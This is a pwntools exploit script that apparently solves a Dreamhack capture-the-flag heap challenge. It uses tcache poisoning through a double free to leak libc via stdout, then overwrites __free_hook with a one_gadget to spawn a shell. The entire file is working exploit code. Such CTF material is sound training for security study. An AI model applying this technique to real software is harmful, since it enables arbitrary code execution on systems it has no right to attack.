#!/usr/bin/python3 
from pwn import * 

context.arch = "amd64"
context.log_level = "debug"
context.binary = elf = ELF('./tcache_poison_patched')
libc = ELF('./libc.so.6')

def add(size, content) -> None:
    p.sendlineafter(b'Edit\n', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Content: ', content)
    return None 

def delete() -> None:
    p.sendlineafter(b'Edit\n', b'2')
    return None 

def edit(content) -> None:
    p.sendlineafter(b'Edit\n', b'4')
    p.sendafter(b'Edit chunk: ', content)
    return None 

def view() -> None:
    p.sendlineafter(b'Edit\n', b'3')
    return None 

one_gadget = 0x4f432
p = process('./tcache_poison_patched')
# p = remote('host3.dreamhack.games', 16978)
# Leak libc 
stdout = elf.symbols["stdout"]

add(0x20, b'aaa')
delete()
edit(b'\x00' * 0x10)
delete()

add(0x20, p64(stdout)) 
add(0x20, p64(0))
add(0x20, b'\x60')
view()
p.recvuntil(b'Content: ')
leak = u64(p.recvn(6) + b'\x00' * 2)
libc_base = leak - libc.symbols["_IO_2_1_stdout_"]
log.info('Leak: ' + str(leak))

# Overwrite __free_hook 
delete()
free_hook = libc.symbols["__free_hook"] + libc_base 
one_gadget = one_gadget + libc_base 
add(0x30, b'aaa')
delete()
edit(b'\x00' * 0x10)
delete()

add(0x30, p64(free_hook)) 
add(0x30, p64(0))
add(0x30, p64(one_gadget))
delete()
p.interactive()
